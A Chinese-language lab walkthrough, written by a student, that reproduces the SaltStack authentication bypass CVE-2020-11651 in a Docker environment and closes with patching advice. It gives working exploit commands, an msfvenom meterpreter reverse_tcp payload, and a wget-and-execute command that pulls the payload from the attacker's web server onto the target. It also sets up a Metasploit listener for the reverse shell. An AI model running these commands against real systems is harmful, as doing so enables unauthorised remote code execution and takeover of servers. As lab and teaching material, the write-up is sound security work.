本文由东塔网络安全学院-10期班学员stride同学投稿。

* * *

## 1.简介

* * *

 **SaltStack**
是基于Python开发的一套C/S架构配置管理工具，是一个服务器基础架构集中化管理平台，具备配置管理、远程执行、监控等功能，基于Python语言实现，结合轻量级消息队列（ZeroMQ）与Python第三方模块（Pyzmq、PyCrypto、Pyjinjia2、python-msgpack和PyYAML等）构建。

通过部署SaltStack，运维人员可以在成千万台服务器上做到批量执行命令，根据不同业务进行配置集中化管理、分发文件、采集服务器数据、操作系统基础及软件包管理等，SaltStack是运维人员提高工作效率、规范业务配置与操作的利器。

* * *

## 2.概述

* * *

 **CVE-2020-11651：** 认证绕过漏洞，攻击者通过构造恶意请求，绕过Salt
Master的验证逻辑，调用相关未授权函数功能，达到远程命令执行目的。

* * *

## 3.漏洞影响范围

* * *

  * SaltStack < 2019.2.4

  * SaltStack < 3000.2

* * *

## 4.修复版本

* * *

  * 2019.2.4

  * 3000.2

* * *

## 5.漏洞复现

* * *

### 5.1 环境说明:

* * *

  * 靶机: 192.168.190.128(ubuntu18.04)(基于Docker搭建漏洞环境)

  * 攻击机: 192.168.190.129(kali2020.4)

  * exp:`https://github.com/heikanet/CVE-2020-11651-CVE-2020-11652-EXP`

* * *

### 5.2 拉取镜像

* * *
    
    
    docker pull vulfocus/saltstack-cve_2020_11651

拉取镜像的过程可能有点慢,建议配置docker镜像加速器;

因为我已经拉取过镜像,所以直接下一步;

* * *

### 5.3 启动镜像

* * *
    
    
    docker run -d -p 4506:4506 -p 4505:4505 vulfocus/saltstack-cve_2020_11651

查看docker是否开启

    
    
    docker ps

![](https://image.3001.net/images/20210107/1609996568_5ff69918315aab97dd71a.png!small)

环境启动成功

* * *

### 5.4 漏洞利用

* * *

1.安装 python salt模块

    
    
    pip3 install salt

![](https://image.3001.net/images/20210107/1609996589_5ff6992d106338841eaf7.png!small)

查看是否已成功安装 salt

    
    
    pip3 list

![](https://image.3001.net/images/20210107/1609996600_5ff69938d2966cafc2152.png!small)

* * *

2.exp使用方法

    
    
    python3 CVE-2020-11651.py

![](https://image.3001.net/images/20210107/1609996612_5ff6994461be71d7b29b2.png!small)

* * *

3.尝试读取文件

![](https://image.3001.net/images/20210107/1609996630_5ff69956a0faf303482b9.png!small)

* * *

4.尝试反弹shell

1.常规方式反弹shell失败

尝试很多方法，更换exp,更改反弹端口号,但是都没有成功~

![](https://image.3001.net/images/20210107/1609996640_5ff69960d664015c29b52.png!small)

* * *

2.寻找失败原因

找了很久终于找到一篇文章,无法反弹shell的原因可能是搭建的docker环境中不存在nc命令

测试靶机发现已安装nc命令

![](https://image.3001.net/images/20210107/1609996652_5ff6996c133a20ea221a9.png!small)

* * *

忽然想到我的攻击机kali是2020.4版本,使用的shell是zsh;而ubuntu使用的shell类型是bash猜测有可能是这个原因导致无法反弹

![](https://image.3001.net/images/20210107/1609996661_5ff6997578cc1d4620087.png!small)

![](https://image.3001.net/images/20210107/1609996671_5ff6997f0489940ed16dc.png!small)

尝试修改kali的shell为bash,失败告终~

* * *

3.上传木马

按照文章中的方法:

更换exp:`https://github.com/dozernz/cve-2020-11651`

然后尝试在攻击机生成一个木马,名为test

    
    
    msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp  LHOST=192.168.190.129 LPORT=6666  -i 3 -f elf -o test

![](https://image.3001.net/images/20210107/1609996682_5ff6998abf606c13404e8.png!small)

* * *

开启攻击机Apache:

    
    
    /etc/init.d/apache2 start

查看apache是否开启

    
    
    service apache2 status

![](https://image.3001.net/images/20210107/1609996695_5ff6999778c9c4cba98b7.png!small)

* * *

复制木马到apache网站根目录

    
    
    cp test /var/www/html/test

![](https://image.3001.net/images/20210107/1609996705_5ff699a17e68e6cfad06c.png!small)

* * *

利用exp执行命令进行远程下载: (报错是exp脚本问题)

    
    
    python3 CVE-2020-11651.py 192.168.190.128 master 'wget http://192.168.190.129/test|./test'

![](https://image.3001.net/images/20210107/1609996716_5ff699ac9f441b3666135.png!small)

* * *

添加执行权限

    
    
    python3 CVE-2020-11651.py 192.168.190.128 master 'chmod +x test |./test'

![](https://image.3001.net/images/20210107/1609996735_5ff699bf24143f40827ea.png!small)

* * *

4.开启监听

1.开始msf

    
    
    msfconsole

![](https://image.3001.net/images/20210107/1609996745_5ff699c9cc73d6116aaae.png!small)

* * *

2.加载模块

    
    
    use exploit/multi/handler 

![](https://image.3001.net/images/20210107/1609996758_5ff699d643e98d90a7279.png!small)

* * *

3.设置payload

    
    
    set payload linux/x64/meterpreter/reverse_tcp

![](https://image.3001.net/images/20210107/1609996767_5ff699df48628699f0bb2.png!small)

* * *

4.设置监听IP&Port

    
    
    set lhost 192.168.190.129  
    ​  
    set lport 6666

![](https://image.3001.net/images/20210107/1609996776_5ff699e843d56e4e94243.png!small)

* * *

5.执行

    
    
    exploit

![](https://image.3001.net/images/20210107/1609996785_5ff699f14168c444aece9.png!small)

* * *

6.远程执行靶机上的木马

    
    
    python3 CVE-2020-11651.py 192.168.190.128 master './test'

![](https://image.3001.net/images/20210107/1609996794_5ff699faa8bbc6f758637.png!small)

* * *

7.成功获得会话

![](https://image.3001.net/images/20210107/1609996805_5ff69a05173e1ad3691d1.png!small)

* * *

## 6.漏洞修复方案

  

* * *

  1. SaltStack官方已发布最新版本修复此漏洞，相关用户及时更新至安全版本及其以上,升级前做好快照备份。

  2. 开启SaltStack自动更新，实时获取补丁或升级至安全版本。

  3. 禁止将Salt Master默认监听端口（4505、4506）向公网开放，设置为仅对可信对象开放。

* * *

## 7.参考链接:

* * *
    
    
    https://mp.weixin.qq.com/s/4pBltA7eo58lk8WES9T4yQ  
    https://www.cnblogs.com/cl0wn/p/12918432.html  
    ​  
    感谢各位前辈的无私分享!

